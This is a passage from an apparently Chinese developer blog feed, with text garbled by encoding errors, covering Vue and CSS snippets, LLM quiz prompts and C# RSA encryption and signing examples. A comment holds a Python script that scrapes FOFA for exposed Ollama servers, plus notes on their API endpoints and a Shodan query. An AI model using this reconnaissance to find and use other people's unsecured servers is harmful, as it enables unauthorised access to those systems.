class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="comment">/* å¯ä»¥åœ¨è¿™é‡Œæ·»åŠ ä¸€äº›æ ·å¼ */</span></span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">textarea</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">button</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  </span></span><br><span class="line"><span class="language-css">  pre &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">white-space</span>: pre-wrap; <span class="comment">/* ä¿ç•™æ¢è¡Œç¬¦ */</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#f4f4f4</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure><h1 id="å¯æ»šåŠ¨æ¡†"><a href="#å¯æ»šåŠ¨æ¡†" class="headerlink" title="å¯æ»šåŠ¨æ¡†"></a>å¯æ»šåŠ¨æ¡†</h1><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ CSS çš„ overflow å±æ€§ã€‚</p><pre><code>  &lt;div&gt;    &lt;h2&gt;å¯¹è¯å†…å®¹:&lt;/h2&gt;    &lt;div style=&quot;max-height: 200px; overflow-y: auto;&quot;&gt;      &lt;pre&gt;&#123;&#123; conversation &#125;&#125;&lt;/pre&gt;    &lt;/div&gt;  &lt;/div&gt;</code></pre><p>æˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªæ–°çš„ <div> å…ƒç´ ï¼Œå¹¶è®¾ç½®äº†å®ƒçš„ style å±æ€§ã€‚max-height: 200px é™åˆ¶äº†è¿™ä¸ªæ¡†çš„æœ€å¤§é«˜åº¦ï¼Œè€Œ overflow-y: auto åˆ™å…è®¸åœ¨å†…å®¹è¶…å‡ºè¿™ä¸ªé«˜åº¦æ—¶å‡ºç°æ»šåŠ¨æ¡ã€‚</p><h1 id="æ™ºå•†æµ‹è¯•"><a href="#æ™ºå•†æµ‹è¯•" class="headerlink" title="æ™ºå•†æµ‹è¯•"></a>æ™ºå•†æµ‹è¯•</h1><p>strawberryæœ‰å¤šå°‘ä¸ªrï¼Ÿ<br>10.11å’Œ10.2è°å¤§ï¼Ÿ<br>24ç‚¹æ¸¸æˆè§£é¢˜:3 4 7 13<br>æ ‘ä¸Š10åªé¸Ÿï¼Œå¼€æªæ‰“æ­»1åªï¼Œè¯·é—®è¿˜æœ‰å¤šå°‘åªé¸Ÿï¼Ÿ</p><!--fofa pyimport base64import requestss = 'app="Ollama" && country="US" && is_domain=false'encoded_content = base64.b64encode(s.encode('utf-8')).decode('utf-8')url = f"https://fofa.info/result?qbase64={encoded_content}"user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"try:    headers = {'User-Agent': user_agent}    response = requests.get(url, headers=headers)    response.raise_for_status()except requests.RequestException as e:    print(f"è¯·æ±‚å¤±è´¥: {str(e)}")    exit(1)start_tag = 'hsxa-host"><a href="'end_tag = '"'matches = []start_index = 0while True:    start = response.text.find(start_tag, start_index)    if start == -1:         break    end = response.text.find(end_tag, start + len(start_tag))    if end == -1:        break    matches.append(response.text[start + len(start_tag):end])    start_index = endwith open('result.txt', 'a', encoding='utf-8') as file:    for match in matches:        file.write(f"{match}\n")        print(match)print("å·²ä¿å­˜ï¼šresult.txt")country="US" XXfofaèµ„æ–™https://linux.do/t/topic/211974Fofahttps://fofa.info/app="Ollama" && is_domain=falsehttps://github.com/ollama/ollama/blob/main/docs/api.mdXXX/api/tags/v1/modelshttps://www.shodan.io/search?query=Ollama+is+running-marscode  ide.cloud.tencent.comhttps://bolt.new-cherry studio å®¢æˆ·ç«¯ -->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DeepSeek&quot;&gt;&lt;a href=&quot;#DeepSeek&quot; class=&quot;headerlink&quot; title=&quot;DeepSeek&quot;&gt;&lt;/a&gt;DeepSeek&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;DeepSeek&lt;/strong&gt;æ˜¯æ­å·æ·±åº¦æ±‚ç´¢äººå·¥æ™ºèƒ½æŠ€æœ¯æœ‰é™å…¬å¸æ¨å‡ºçš„äºº</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>RASåŠ å¯†</title>
    <link href="https://banjinmei.github.io/2025/01/21/RAS%E5%8A%A0%E5%AF%86/"/>
    <id>https://banjinmei.github.io/2025/01/21/RAS%E5%8A%A0%E5%AF%86/</id>
    <published>2025-01-21T02:07:25.000Z</published>
    <updated>2025-01-21T03:28:19.251Z</updated>
    
    <content type="html"><![CDATA[<p>c# RAS</p><p>C#éå¯¹ç§°åŠ å¯†  ä¾‹å­</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> originalText = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">        <span class="comment">// åˆ›å»º RSA ç®—æ³•å®ä¾‹</span></span><br><span class="line">        <span class="keyword">using</span> (RSA rsa = RSA.Create())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// å¯¼å‡ºå…¬é’¥</span></span><br><span class="line">            <span class="built_in">string</span> publicKey = Convert.ToBase64String(rsa.ExportRSAPublicKey());</span><br><span class="line">            <span class="comment">// å¯¼å‡ºç§é’¥</span></span><br><span class="line">            <span class="built_in">string</span> privateKey = Convert.ToBase64String(rsa.ExportRSAPrivateKey());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åŠ å¯†</span></span><br><span class="line">            <span class="built_in">byte</span>[] encryptedBytes = Encrypt(originalText, publicKey);</span><br><span class="line">            <span class="built_in">string</span> encryptedText = Convert.ToBase64String(encryptedBytes);</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;Encrypted Text: <span class="subst">&#123;encryptedText&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è§£å¯†</span></span><br><span class="line">            <span class="built_in">string</span> decryptedText = Decrypt(encryptedBytes, privateKey);</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;Decrypted Text: <span class="subst">&#123;decryptedText&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Encrypt</span>(<span class="params"><span class="built_in">string</span> data, <span class="built_in">string</span> publicKeyString</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// å°†å…¬é’¥ä» Base64 å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">        <span class="built_in">byte</span>[] publicKeyBytes = Convert.FromBase64String(publicKeyString);</span><br><span class="line">        <span class="keyword">using</span> (RSA rsa = RSA.Create())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// å¯¼å…¥å…¬é’¥</span></span><br><span class="line">            rsa.ImportRSAPublicKey(publicKeyBytes, <span class="keyword">out</span> _);</span><br><span class="line">            <span class="comment">// å°†æ•°æ®è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">            <span class="built_in">byte</span>[] dataBytes = Encoding.UTF8.GetBytes(data);</span><br><span class="line">            <span class="comment">// åŠ å¯†æ•°æ®</span></span><br><span class="line">            <span class="keyword">return</span> rsa.Encrypt(dataBytes, RSAEncryptionPadding.OaepSHA256);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Decrypt</span>(<span class="params"><span class="built_in">byte</span>[] encryptedData, <span class="built_in">string</span> privateKeyString</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// å°†ç§é’¥ä» Base64 å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">        <span class="built_in">byte</span>[] privateKeyBytes = Convert.FromBase64String(privateKeyString);</span><br><span class="line">        <span class="keyword">using</span> (RSA rsa = RSA.Create())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// å¯¼å…¥ç§é’¥</span></span><br><span class="line">            rsa.ImportRSAPrivateKey(privateKeyBytes, <span class="keyword">out</span> _);</span><br><span class="line">            <span class="comment">// è§£å¯†æ•°æ®</span></span><br><span class="line">            <span class="built_in">byte</span>[] decryptedBytes = rsa.Decrypt(encryptedData, RSAEncryptionPadding.OaepSHA256);</span><br><span class="line">            <span class="comment">// å°†è§£å¯†åçš„å­—èŠ‚æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="keyword">return</span> Encoding.UTF8.GetString(decryptedBytes);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²è§£å¯†ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">StringDecryption</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> encryptedText = <span class="string">&quot;your_encrypted_text_here&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> privateKey = <span class="string">&quot;your_private_key_here&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> decryptedText = Decrypt(encryptedText, privateKey);</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;Decrypted Text: <span class="subst">&#123;decryptedText&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;Error during decryption: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Decrypt</span>(<span class="params"><span class="built_in">string</span> encryptedText, <span class="built_in">string</span> privateKey</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">byte</span>[] encryptedBytes = Convert.FromBase64String(encryptedText);</span><br><span class="line">        <span class="built_in">byte</span>[] privateKeyBytes = Convert.FromBase64String(privateKey);</span><br><span class="line">        <span class="keyword">using</span> (RSA rsa = RSA.Create())</span><br><span class="line">        &#123;</span><br><span class="line">            rsa.ImportRSAPrivateKey(privateKeyBytes, <span class="keyword">out</span> _);</span><br><span class="line">            <span class="built_in">byte</span>[] decryptedBytes = rsa.Decrypt(encryptedBytes, RSAEncryptionPadding.OaepSHA256);</span><br><span class="line">            <span class="keyword">return</span> Encoding.UTF8.GetString(decryptedBytes);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥çš„å¯†æ–‡å’Œç§é’¥éƒ½åº”è¯¥æ˜¯åˆæ³•çš„ Base64 ç¼–ç å­—ç¬¦ä¸²ï¼Œå¦åˆ™ Convert.FromBase64String ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><h1 id="ç§é’¥ç­¾å"><a href="#ç§é’¥ç­¾å" class="headerlink" title="ç§é’¥ç­¾å"></a>ç§é’¥ç­¾å</h1><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">SignatureExample</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> data = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> privateKey = <span class="string">&quot;your_private_key_here&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] signature = SignData(data, privateKey);</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;Signature: <span class="subst">&#123;Convert.ToBase64String(signature)&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;Error during signing: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">SignData</span>(<span class="params"><span class="built_in">string</span> data, <span class="built_in">string</span> privateKey</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">byte</span>[] dataBytes = Encoding.UTF8.GetBytes(data);</span><br><span class="line">        <span class="built_in">byte</span>[] privateKeyBytes = Convert.FromBase64String(privateKey);</span><br><span class="line">        <span class="keyword">using</span> (RSA rsa = RSA.Create())</span><br><span class="line">        &#123;</span><br><span class="line">            rsa.ImportRSAPrivateKey(privateKeyBytes, <span class="keyword">out</span> _);</span><br><span class="line">            <span class="comment">// ä½¿ç”¨ RSASignaturePadding.Pkcs1 ç­¾å</span></span><br><span class="line">            <span class="keyword">return</span> rsa.SignData(dataBytes, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dataï¼šéœ€è¦ç­¾åçš„æ•°æ®ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªç®€å•çš„å­—ç¬¦ä¸² â€œHello, World!â€ã€‚<br>privateKeyï¼šç”¨äºç­¾åçš„ç§é’¥ï¼Œä»¥ Base64 ç¼–ç çš„å­—ç¬¦ä¸²å½¢å¼æä¾›ã€‚éœ€è¦å°† â€œyour_private_key_hereâ€ æ›¿æ¢ä¸ºå®é™…çš„ç§é’¥ã€‚<br>SignData å‡½æ•°ï¼š<br>byte[] dataBytes &#x3D; Encoding.UTF8.GetBytes(data);ï¼šå°†éœ€è¦ç­¾åçš„æ•°æ®è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ï¼Œå› ä¸ºç­¾åæ“ä½œé€šå¸¸æ˜¯åœ¨å­—èŠ‚çº§åˆ«è¿›è¡Œçš„ã€‚<br>byte[] privateKeyBytes &#x3D; Convert.FromBase64String(privateKey);ï¼šå°† Base64 ç¼–ç çš„ç§é’¥è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ï¼Œä»¥ä¾¿ RSA ç®—æ³•å¯ä»¥ä½¿ç”¨ã€‚<br>using (RSA rsa &#x3D; RSA.Create())ï¼šåˆ›å»ºä¸€ä¸ª RSA ç®—æ³•çš„å®ä¾‹ã€‚<br>rsa.ImportRSAPrivateKey(privateKeyBytes, out _);ï¼šå°†ç§é’¥å¯¼å…¥ RSA ç®—æ³•å®ä¾‹ã€‚<br>return rsa.SignData(dataBytes, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);ï¼šä½¿ç”¨å¯¼å…¥çš„ç§é’¥å¯¹æ•°æ®è¿›è¡Œç­¾åã€‚<br>dataBytesï¼šè¦ç­¾åçš„æ•°æ®çš„å­—èŠ‚è¡¨ç¤ºã€‚<br>HashAlgorithmName.SHA256ï¼šä½¿ç”¨ SHA256 ç®—æ³•å¯¹æ•°æ®è¿›è¡Œå“ˆå¸Œå¤„ç†ã€‚<br>RSASignaturePadding.Pkcs1ï¼šä½¿ç”¨ PKCS #1 ç­¾åå¡«å……æ–¹æ¡ˆã€‚ </p><h2 id="ä½¿ç”¨è¯´æ˜ï¼š"><a href="#ä½¿ç”¨è¯´æ˜ï¼š" class="headerlink" title="ä½¿ç”¨è¯´æ˜ï¼š"></a>ä½¿ç”¨è¯´æ˜ï¼š</h2><p>å°† your_private_key_here æ›¿æ¢ä¸ºè‡ªå·±çš„ RSA ç§é’¥ã€‚<br>ç¨‹åºå°†å¯¹ â€œHello, World!â€ è¿™ä¸ªæ•°æ®è¿›è¡Œç­¾åã€‚<br>ç­¾åç»“æœå°†ä»¥ Base64 ç¼–ç çš„å­—ç¬¦ä¸²å½¢å¼è¾“å‡ºã€‚<br>è¿è¡Œç¨‹åºï¼Œå¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œå°†çœ‹åˆ°ç”Ÿæˆçš„ç­¾åï¼›å¦‚æœå‡ºç°å¼‚å¸¸ï¼Œå°†è¾“å‡ºé”™è¯¯æ¶ˆæ¯ã€‚<br>è¯·ç¡®ä¿ç§é’¥çš„å®‰å…¨æ€§ï¼Œå› ä¸ºç§é’¥ç”¨äºç”Ÿæˆç­¾åï¼Œä¸€æ—¦æ³„éœ²ï¼Œç­¾åçš„å®‰å…¨æ€§å°†å—åˆ°å¨èƒã€‚åŒæ—¶ï¼Œæ ¹æ®éœ€è¦å¯ä»¥ä½¿ç”¨ä¸åŒçš„å“ˆå¸Œç®—æ³•å’Œç­¾åå¡«å……æ–¹æ¡ˆï¼Œä½†è¦ç¡®ä¿é€šä¿¡åŒæ–¹ä½¿ç”¨ç›¸åŒçš„è®¾ç½®ï¼Œä»¥ä¿è¯ç­¾åéªŒè¯çš„æœ‰æ•ˆæ€§ã€‚<br>æ­¤å¤–ï¼Œåœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¯èƒ½éœ€è¦è€ƒè™‘å¯¹ç­¾åç»“æœè¿›è¡Œå­˜å‚¨æˆ–ä¼ è¾“ï¼Œä»¥åŠå¯¹ç­¾åçš„éªŒè¯è¿‡ç¨‹ï¼Œä»¥ç¡®ä¿æ•°æ®çš„å®Œæ•´æ€§å’Œæ¥æºçš„çœŸå®æ€§ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç­¾åéªŒè¯ç¤ºä¾‹ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">SignatureVerification</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> data = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> publicKey = <span class="string">&quot;your_public_key_here&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> signatureBase64 = <span class="string">&quot;your_signature_here&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">bool</span> isValid = VerifySignature(data, signatureBase64, publicKey);</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;Signature is valid: <span class="subst">&#123;isValid&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;Error during verification: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">VerifySignature</span>(<span class="params"><span class="built_in">string</span> data, <span class="built_in">string</span> signatureBase64, <span class="built_in">string</span> publicKey</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">byte</span>[] dataBytes = Encoding.UTF8.GetBytes(data);</span><br><span class="line">        <span class="built_in">byte</span>[] signatureBytes = Convert.FromBase64String(signatureBase64);</span><br><span class="line">        <span class="built_in">byte</span>[] publicKeyBytes = Convert.FromBase64String(publicKey);</span><br><span class="line">        <span class="keyword">using</span> (RSA rsa = RSA.Create())</span><br><span class="line">        &#123;</span><br><span class="line">            rsa.ImportRSAPublicKey(publicKeyBytes, <span class="keyword">out</span> _);</span><br><span class="line">            <span class="keyword">return</span> rsa.VerifyData(dataBytes, signatureBytes, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dataï¼šåŸå§‹æ•°æ®ï¼Œç”¨äºéªŒè¯ç­¾åæ˜¯å¦æ˜¯å¯¹è¯¥æ•°æ®çš„ç­¾åã€‚<br>signatureBase64ï¼šéœ€è¦éªŒè¯çš„ç­¾åï¼Œä»¥ Base64 ç¼–ç çš„å­—ç¬¦ä¸²å½¢å¼æä¾›ã€‚<br>publicKeyï¼šç”¨äºéªŒè¯ç­¾åçš„å…¬é’¥ï¼Œä»¥ Base64 ç¼–ç çš„å­—ç¬¦ä¸²å½¢å¼æä¾›ã€‚<br>VerifySignature å‡½æ•°ï¼š<br>byte[] dataBytes &#x3D; Encoding.UTF8.GetBytes(data);ï¼šå°†åŸå§‹æ•°æ®è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ã€‚<br>byte[] signatureBytes &#x3D; Convert.FromBase64String(signatureBase64);ï¼šå°† Base64 ç¼–ç çš„ç­¾åè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ã€‚<br>byte[] publicKeyBytes &#x3D; Convert.FromBase64String(publicKey);ï¼šå°† Base64 ç¼–ç çš„å…¬é’¥è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ã€‚<br>using (RSA rsa &#x3D; RSA.Create())ï¼šåˆ›å»ºä¸€ä¸ª RSA ç®—æ³•çš„å®ä¾‹ã€‚<br>rsa.ImportRSAPublicKey(publicKeyBytes, out _);ï¼šå°†å…¬é’¥å¯¼å…¥ RSA ç®—æ³•å®ä¾‹ã€‚<br>return rsa.VerifyData(dataBytes, signatureBytes, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);ï¼šä½¿ç”¨å…¬é’¥éªŒè¯ç­¾åã€‚<br>dataBytesï¼šåŸå§‹æ•°æ®çš„å­—èŠ‚è¡¨ç¤ºã€‚<br>signatureBytesï¼šè¦éªŒè¯çš„ç­¾åçš„å­—èŠ‚è¡¨ç¤ºã€‚<br>HashAlgorithmName.SHA256ï¼šä½¿ç”¨ SHA256 å“ˆå¸Œç®—æ³•ï¼Œä¸ç­¾åæ—¶ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•ä¿æŒä¸€è‡´ã€‚<br>RSASignaturePadding.Pkcs1ï¼šä½¿ç”¨ PKCS #1 ç­¾åå¡«å……æ–¹æ¡ˆï¼Œä¸ç­¾åæ—¶ä½¿ç”¨çš„å¡«å……æ–¹æ¡ˆä¿æŒä¸€è‡´ã€‚</p><h2 id="ä½¿ç”¨è¯´æ˜ï¼š-1"><a href="#ä½¿ç”¨è¯´æ˜ï¼š-1" class="headerlink" title="ä½¿ç”¨è¯´æ˜ï¼š"></a>ä½¿ç”¨è¯´æ˜ï¼š</h2><p>å°† your_public_key_here æ›¿æ¢ä¸ºè‡ªå·±çš„ RSA å…¬é’¥ã€‚<br>å°† your_signature_here æ›¿æ¢ä¸ºè¦éªŒè¯çš„ç­¾åã€‚<br>ç¨‹åºå°†å¯¹ç­¾åè¿›è¡ŒéªŒè¯ï¼Œå¹¶è¾“å‡ºéªŒè¯ç»“æœã€‚<br>è¿è¡Œç¨‹åºï¼Œå¦‚æœç­¾åæœ‰æ•ˆï¼Œå°†è¾“å‡º Signature is valid: 